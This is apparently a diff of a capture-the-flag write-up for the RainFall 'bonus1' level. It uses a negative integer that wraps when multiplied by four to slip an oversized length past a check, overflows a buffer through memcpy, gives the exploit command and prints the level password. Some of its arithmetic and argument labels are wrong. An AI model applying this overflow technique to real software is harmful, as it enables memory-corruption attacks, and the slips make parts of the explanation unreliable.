@@ -4,22 +4,26 @@ After disassembling the binary we can see that main() function call execl() with
 only if it assert number == 0x574f4c46      <=>     "WOLF"
 but number also need to be less than 10
 
-We could somewhat use the memcpy() to replace the number value
-as the prototype of memcpy use size_t as a length parameter
-void * memcpy (void * dest, void * src, size_t n);
-
-size_t is an unsigned number
-if the length parameter is a big negative number it will be convert to a small positive one
+We could somewhat use the memcpy() to replace the number value with a buffer overflow
+we need to overflow 4 Bytes after the buffer
 
 
-we need to overflow 4 Bytes after the buffer so we need to make number equal to 11
+to do that we need to make `number * 4 == 44`
+while number remain less than 10
 
-and set the value of argv[1] to match requirement
+
+Here we will use number underflow in our adventage
+
+11 				=> 0x0000000b  * 4	=> 0x 0000002c
+INT_MIN + 11 	=> 0x8000000b  * 4	=> 0x70000002c
+but here we use 32 bit number so 0x70000002c underflow to 0x0000002c which is equal to 44
+
+then we set the value of argv[1] to match requirement
 
 argv[0] => (INT_MIN + 11) => -(2**31) + 11 => -2147483637
 argv[1] => "#" * 40 + "FLOW"
 
-bonus1@RainFall:~$> ./bonus1 "-2147483604" "########################################FLOW"
+bonus1@RainFall:~$> ./bonus1 "-2147483637" "########################################FLOW"
 
 bonus2@RainFall:~$> cat ~bonus2/.pass
 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
